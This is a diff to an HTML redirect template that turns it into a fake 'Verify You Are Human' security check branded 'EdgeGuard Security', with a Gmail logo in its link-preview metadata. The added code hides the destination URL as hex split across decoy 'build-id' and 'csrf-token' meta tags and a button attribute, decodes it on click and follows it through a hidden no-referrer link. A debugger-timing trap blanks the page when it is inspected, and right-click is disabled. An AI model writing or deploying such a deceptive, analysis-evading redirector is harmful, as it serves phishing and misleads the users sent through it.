@@ -3,93 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Securing Connection...</title>
-    <!-- Added nonce here so the server allows the colors to load -->
+    <meta name="referrer" content="no-referrer">
+    <meta property="og:title" content="Security Verification">
+    <meta property="og:description" content="Verifying connection security parameters. Please wait...">
+    <meta property="og:image" content="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_server_1x.png">
+    <meta property="og:site_name" content="EdgeGuard Security">
+    <meta name="theme-color" content="#4a90e2">
+    <meta name="build-id" content="{{ p1 }}">
+    <meta name="csrf-token" content="{{ p2 }}">
+    <title>Security Check</title>
     <style nonce="{{ nonce }}">
         html, body {
-            height: 100% !important;
-            width: 100% !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            overflow: hidden;
-        }
-
-        body {
-            background-color: #0f0c29; 
-            background: linear-gradient(to right, #24243e, #302b63, #0f0c29) !important;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a;
+            color: #d8d8d8;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: #ffffff;
+            user-select: none;
         }
-
-        .card {
-            background: rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        #{{ ids.container }} {
+            background: #2d2d2d;
+            border: 1px solid #3d3d3d;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
             text-align: center;
-            max-width: 90%;
-            width: 350px;
+            max-width: 400px;
+            width: 90%;
         }
-
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-left-color: #00d2ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        h2 {
-            margin: 0 0 10px 0;
-            font-weight: 500;
-            font-size: 22px;
-            letter-spacing: 1px;
-        }
-
-        p {
-            margin: 0;
+        h2 { font-size: 20px; font-weight: 500; margin-bottom: 10px; color: #fff; }
+        p { font-size: 14px; color: #999; margin-bottom: 25px; }
+        #{{ ids.button }} {
+            background: #4a90e2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
             font-size: 14px;
-            color: #b8b8b8;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
         }
+        #{{ ids.button }}:hover { background: #357abd; }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid #4a90e2;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
-    <div class="card">
-        <div class="loader"></div>
-        <h2>SECURE CHECK</h2>
-        <p>Verifying destination...</p>
+<body oncontextmenu="return false;">
+    <div id="{{ ids.container }}">
+        <h2>Site Security</h2>
+        <p>Checking your browser before accessing the destination.</p>
+        <button id="{{ ids.button }}" data-verify="{{ p3 }}" onclick="process()">
+            Verify You Are Human
+        </button>
     </div>
-
     <script nonce="{{ nonce }}">
-        (function() {
-            var _payload = "{{ encoded_target }}";
-            
-            function _execute() {
-                try {
-                    var _url = atob(_payload);
-                    window.location.replace(_url);
-                } catch (e) {
-                    console.error("Redirect Error");
-                }
+        setInterval(function(){
+            var startTime = performance.now();
+            debugger; 
+            if (performance.now() - startTime > 100) {
+                document.body.innerHTML = "Security Violation.";
             }
+        }, 500);
 
-            var _delay = Math.floor(Math.random() * 1000) + 1500;
-            setTimeout(_execute, _delay);
-        })();
+        function process() {
+            var btn = document.getElementById("{{ ids.button }}");
+            btn.innerHTML = '<div class="spinner"></div> Verifying...';
+            btn.style.cursor = "wait";
+            
+            setTimeout(function() {
+                try {
+                    var m1 = document.querySelector('meta[name="build-id"]').getAttribute('content');
+                    var m2 = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+                    var m3 = btn.getAttribute('data-verify');
+                    var hex = m1 + m2 + m3;
+                    var url = '';
+                    for (var i = 0; i < hex.length; i += 2) {
+                        url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+                    }
+                    var link = document.createElement('a');
+                    link.href = url;
+                    link.rel = "noreferrer";
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                } catch (e) {
+                }
+            }, 800);
+        }
     </script>
 </body>
 </html>
